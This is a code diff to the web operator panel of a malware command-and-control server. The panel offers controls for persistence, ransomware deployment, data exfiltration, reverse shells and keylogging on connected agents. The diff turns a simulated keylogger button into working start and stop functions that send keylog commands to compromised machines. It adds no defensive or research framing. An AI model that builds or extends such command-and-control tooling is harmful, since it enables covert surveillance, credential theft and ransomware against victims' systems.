@@ -660,16 +660,20 @@
                     </table>
                 </div>
 
-                <!-- Logs -->
                 <div id="logs" style="display:none;">
                     <h2>Activity Logs</h2>
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <div></div> <!-- Empty div for spacing -->
+                        <button onclick="window.open('/logs', '_blank')" style="margin: 10px;cursor: pointer;">
+                            View command logs
+                        </button>
+                    </div>
                     <div class="logs">
-                        <div class="log-entry">[INFO] Agent 1 connected.</div>
-                        <div class="log-entry">[INFO] Command executed on Agent 2.</div>
-                        <div class="log-entry"><span>[ERROR]</span> Agent 3 connection failed.</div>
+                        <div class="log-entry">[INFO] C2 Server Started Successfully.</div>
+                        <div class="log-entry">[INFO] Web interface is working properly.</div>
+                        <!-- <div class="log-entry"><span>[ERROR]</span> Agent 3 connection failed.</div> -->
                     </div>
                 </div>
-
                 <!-- Commands -->
                 <div id="commands" style="display:none;">
                     <h2>Multicast Command</h2><br>
@@ -741,7 +745,8 @@
                 <button onclick="showSectionInPanelForAgentActions('sendFile')">Send File</button>
                 <button onclick="showSectionInPanelForAgentActions('persistAgent')">Establish Persistence</button>
                 <button onclick="showSectionInPanelForAgentActions('killAgent')">Kill Agent</button>
-                <button onclick="showSectionInPanelForAgentActions('keylogger')">Run Keylogger</button>
+                <button onclick="showSectionInPanelForAgentActions('start_keylogger')">Start Keylogger</button>
+                <button onclick="showSectionInPanelForAgentActions('stop_keylogger')">Stop Keylogger</button>
                 <button onclick="showSectionInPanelForAgentActions('ransomware')">Deploy Ransomware</button>
                 <button onclick="showSectionInPanelForAgentActions('dataExfil')">Exfiltrate Data</button>
                 <button onclick="showSectionInPanelForAgentActions('reverseShell')">Open Reverse Shell</button>
@@ -785,10 +790,15 @@
                     <p>Warning: This will terminate the agent.</p>
                     <button onclick="killAgent()">Kill</button>
                 </div>
-                <div id="keylogger" class="content-section">
-                    <h3>Run Keylogger</h3>
+                <div id="start_keylogger" class="content-section">
+                    <h3>Start Keylogger</h3>
                     <p>Activate keylogger on the agent.</p>
-                    <button onclick="simulateKeylogger()">Start</button>
+                    <button onclick="startKeylogger()">Start</button>
+                </div>
+                <div id="stop_keylogger" class="content-section">
+                    <h3>Stop Keylogger</h3>
+                    <p>Stop keylogger on the agent.</p>
+                    <button onclick="stopKeylogger()">Stop</button>
                 </div>
                 <div id="ransomware" class="content-section">
                     <h3>Deploy Ransomware</h3>
@@ -1235,9 +1245,24 @@
             }
         }
 
-        function simulateKeylogger() {
-            alert(`Keylogger activated on agent ${currentClientId}`);
+        function startKeylogger() {
+            fetch('/input-command-to-execute-from-web', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientid: currentClientId, command:"start_keylog" })
+            })
+
+            alert(`Keylogger module activated on agent ${currentClientId}`);
             logAction(`Started keylogger on ${currentClientId}`);
+        }
+        function stopKeylogger() {
+            fetch('/input-command-to-execute-from-web', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientid: currentClientId, command:"stop_keylog" })
+            })
+            alert(`Keylogger module deactivated on agent ${currentClientId}`);
+            logAction(`Stopped keylogger on ${currentClientId}`);
         }
 
         function simulateRansomware() {
